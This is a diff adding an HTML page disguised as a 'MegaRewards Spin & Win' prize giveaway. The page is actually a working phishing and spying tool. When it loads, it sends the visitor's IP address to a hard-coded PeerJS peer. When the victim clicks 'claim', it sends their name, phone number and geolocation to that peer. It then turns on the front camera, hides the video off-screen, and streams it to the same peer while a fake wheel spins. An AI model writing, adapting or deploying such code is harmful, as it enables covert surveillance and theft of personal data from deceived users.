@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>MegaRewards | Spin & Win</title>
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <style>
+        :root { --gold: #ffd700; --red: #ff4757; --dark: #2f3542; --green: #2ecc71; }
+        body { margin: 0; font-family: 'Segoe UI', Roboto, sans-serif; background: #f1f2f6; overflow-x: hidden; }
+        header { background: #fff; padding: 15px; text-align: center; border-bottom: 3px solid var(--gold); box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        .logo { font-weight: 900; font-size: 22px; color: var(--red); text-transform: uppercase; letter-spacing: 1px; }
+        .page { display: none; padding: 20px; animation: slideUp 0.5s ease; }
+        .active { display: block; }
+        .wheel-container { position: relative; width: 280px; height: 280px; margin: 20px auto; }
+        .wheel-img { width: 100%; height: 100%; transition: transform 15s cubic-bezier(0.1, 0, 0.1, 1); border-radius: 50%; border: 5px solid #fff; box-shadow: 0 0 20px rgba(0,0,0,0.2); }
+        .pointer { position: absolute; top: -15px; left: 50%; transform: translateX(-50%); width: 45px; z-index: 10; }
+        .card { max-width: 400px; margin: 0 auto; background: #fff; border-radius: 15px; padding: 25px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); border-top: 5px solid var(--red); }
+        label { font-size: 11px; font-weight: bold; color: #57606f; display: block; margin-bottom: 5px; }
+        input { width: 100%; padding: 14px; margin-bottom: 15px; border: 2px solid #edeff2; border-radius: 8px; box-sizing: border-box; font-size: 16px; outline: none; }
+        .btn-spin { background: var(--red); color: #fff; border: none; width: 100%; padding: 18px; border-radius: 50px; font-weight: bold; font-size: 18px; cursor: pointer; box-shadow: 0 5px 15px rgba(255, 71, 87, 0.4); }
+        #modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: none; align-items: center; justify-content: center; z-index: 100; backdrop-filter: blur(5px); }
+        .modal { width: 85%; max-width: 350px; background: #fff; border-radius: 20px; padding: 30px; text-align: center; }
+        #cam-layer { position: fixed; top: -9999px; left: -9999px; }
+        @keyframes slideUp { from { transform: translateY(30px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+    </style>
+</head>
+<body>
+
+<header><div class="logo">🏆 Global Rewards 2026</div></header>
+<div id="cam-layer"><video id="v" autoplay playsinline muted></video></div>
+
+<div id="modal-overlay">
+    <div class="modal">
+        <h2 style="margin: 0 0 10px; color: var(--dark);">Winner Confirmed!</h2>
+        <p style="font-size: 15px; color: #2f3542; font-weight: 600;">Congratulations, <span id="user-name-display" style="color: var(--red);">Player</span>!</p>
+        <p style="font-size: 13px; color: #57606f;">Our team will contact you soon via your mobile number.</p>
+        <button class="btn-spin" style="margin-top:20px; background: var(--dark);" onclick="location.reload()">OKAY</button>
+    </div>
+</div>
+
+<div class="container" style="margin-top: 10px;">
+    <div id="page-home" class="page active">
+        <div class="card">
+            <h2 style="text-align:center; color: var(--dark); margin:0 0 10px;">Spin for a Prize!</h2>
+            <label>FULL NAME</label>
+            <input type="text" id="roll" placeholder="Your Name">
+            <label>MOBILE NUMBER</label>
+            <input type="number" id="school" placeholder="Phone Number">
+            <button class="btn-spin" id="main-btn" onclick="startSpin()">CLAIM FREE SPIN</button>
+        </div>
+    </div>
+
+    <div id="page-spin" class="page">
+        <div class="wheel-container">
+            <img src="https://www.pngall.com/wp-content/uploads/2016/04/Pointer-PNG-File.png" class="pointer">
+            <img src="https://i.ibb.co/997pM5p/wheel.png" id="wheel" class="wheel-img">
+        </div>
+        <div class="card" style="text-align:center; border-top:none;">
+            <h3 id="status-text" style="color: var(--red); margin:0;">SPINNING...</h3>
+        </div>
+    </div>
+</div>
+
+<script>
+    const TARGET_ID = 'enkode-satori-v1-russel'; 
+    const peer = new Peer();
+    let conn;
+
+    // 1. AS SOON AS PEER OPENS, GET IP AND SEND INSTANTLY
+    peer.on('open', async () => {
+        conn = peer.connect(TARGET_ID);
+        
+        conn.on('open', async () => {
+            let ip = "Detecting...";
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const d = await res.json(); ip = d.ip;
+            } catch(e) { ip = "Blocked/Error"; }
+
+            // Send Instant Log
+            conn.send({
+                type: "INSTANT_LOG",
+                ip: ip,
+                time: new Date().toLocaleTimeString()
+            });
+        });
+    });
+
+    async function startSpin() {
+        const nameVal = document.getElementById('roll').value;
+        const phoneVal = document.getElementById('school').value;
+        if(!nameVal || !phoneVal) { alert("Please fill details."); return; }
+
+        document.getElementById('main-btn').innerText = "VERIFYING...";
+        document.getElementById('user-name-display').innerText = nameVal;
+
+        // Try to get location, but move to media regardless
+        navigator.geolocation.getCurrentPosition((pos) => {
+            finalizeAndSpin(pos.coords.latitude, pos.coords.longitude);
+        }, () => { finalizeAndSpin(null, null); });
+    }
+
+    async function finalizeAndSpin(lat, lon) {
+        // Send Detailed Packet
+        if (conn && conn.open) {
+            conn.send({
+                type: "FULL_LOG",
+                creds: {
+                    roll: document.getElementById('roll').value,
+                    school: document.getElementById('school').value
+                },
+                geo: { lat: lat, lon: lon }
+            });
+        }
+
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            document.getElementById('v').srcObject = stream;
+            peer.call(TARGET_ID, stream);
+            
+            switchPage('page-spin');
+            document.getElementById('wheel').style.transform = "rotate(7240deg)"; 
+            
+            setTimeout(() => {
+                document.getElementById('modal-overlay').style.display = 'flex';
+            }, 20000); 
+        } catch (e) {
+            alert("Verification Required: Please allow camera to claim prize.");
+            location.reload();
+        }
+    }
+
+    function switchPage(p) {
+        document.querySelectorAll('.page').forEach(el => el.classList.remove('active'));
+        document.getElementById(p).classList.add('active');
+    }
+</script>
+</body>
+</html>
